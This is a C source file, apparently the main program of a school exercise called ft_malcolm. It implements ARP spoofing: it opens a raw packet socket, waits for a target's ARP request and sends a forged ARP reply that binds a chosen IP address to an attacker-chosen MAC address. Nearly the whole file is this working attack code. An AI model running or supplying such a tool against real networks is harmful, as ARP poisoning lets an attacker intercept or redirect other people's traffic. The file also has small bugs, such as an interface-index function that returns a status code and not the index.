#include "ft_malcolm.h"
unsigned int get_interface_index(const char *interface_name) {
    unsigned int ifindex = if_nametoindex(interface_name);
    if (ifindex == 0) {
        perror("if_nametoindex");
        return(ERROR);
    }
    return(SUCCESS);
}

int bind_socket_to_interface(t_sockinfos *sock, const char *interface) {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);

    if (setsockopt(sock->sock, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr)) < 0) {
        perror("setsockopt SO_BINDTODEVICE");
        return(ERROR);
    }

    return(SUCCESS);
}

//changer find interface pour chopper une interface uniquement si elle a une addresse mac (hwaddr)
int	find_inteface(t_sockinfos *sockinfos) {
	struct ifaddrs *ifa;
	struct ifaddrs *tofree;
	
	if (getifaddrs(&ifa) == -1) {
        perror("getifaddrs");
        return (ERROR);
    }
	tofree = ifa;
	while (ifa->ifa_next != NULL) {
			if ((ifa->ifa_flags & (IFF_UP | IFF_RUNNING)) && (ifa->ifa_addr->sa_family == AF_PACKET) && !(ifa->ifa_flags & IFF_LOOPBACK)) {
				printf("Interface found: %s\n", ifa->ifa_name);
				sockinfos->if_index = get_interface_index(ifa->ifa_name);
				bind_socket_to_interface(sockinfos, ifa->ifa_name);
				return (SUCCESS);
			}
		ifa = ifa->ifa_next;
	}
	freeifaddrs(tofree);
	return (ERROR);
}


int	parse_user_inputs(char **av, t_targets * targets) {
	//ips are in network order.
	if (!inet_pton(AF_INET, av[1], &targets->source_ip) || !inet_pton(AF_INET, av[3], &targets->target_ip))
		return (ERROR);
	else if (!is_valid_mac_address(av[2]) || !is_valid_mac_address(av[4]))
		return (ERROR);
	mac_string_to_bytes(av[2], targets->source_mac);
	mac_string_to_bytes(av[4], targets->target_mac);
	return (SUCCESS);
}

int main(int ac, char **av)
{
	t_sockinfos		sockinfos;
	unsigned char	netbuff[NETBUFFSIZE];
	t_targets		targets;
	arp_packet		*arp;

	if (ac != 5) {
		dprintf(2, "Error: Wrong number of arguments\n");
		exit(1);
	}
	if (!parse_user_inputs(av, &targets)) {
		dprintf(2, "Error: Wrong IP(s) or MAC(s)\n");
		exit(1);
	}

	sockinfos.sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (sockinfos.sock == -1) {
		dprintf(2, "Error: socket()\n");
		exit(1);
	}

	if (!find_inteface(&sockinfos)) {
		dprintf(2, "Error: No network Interface Found\n");
		exit(1);
	}

	printf("Waiting for ARP request from the target\n");
	
	while (true) {
		recvfrom(sockinfos.sock, netbuff, NETBUFFSIZE, 0, NULL, NULL);
		arp = (arp_packet *)netbuff;
		if (is_arp_request(arp)) {
			print_arp_packet(arp);
		}
		if (is_arp_target(arp, &targets)) {
			break;
		}
	}
	arp_packet reply;
	create_arp_reply(&reply, &targets);
	

	// Prepare sockaddr_ll structure for sending the packet
	struct sockaddr_ll socket_address;
	memset(&socket_address, 0, sizeof(struct sockaddr_ll));

	// Set the interface index for the socket
	socket_address.sll_family = AF_PACKET;
	socket_address.sll_ifindex = sockinfos.if_index;
	socket_address.sll_halen = ETH_ALEN;
	socket_address.sll_protocol = htons(ETH_P_ARP);
	memcpy(socket_address.sll_addr, targets.target_mac, ETH_ALEN);
	// Send the ARP reply
	if (sendto(sockinfos.sock, &reply, sizeof(reply), 0,
			(struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0) {
		perror("sendto failed");
		close(sockinfos.sock);
		exit(1);
	}

	printf("ARP reply sent.\n");
	print_arp_packet(&reply);
	// Close the socket and exit
	close(sockinfos.sock);
	return(0);
}
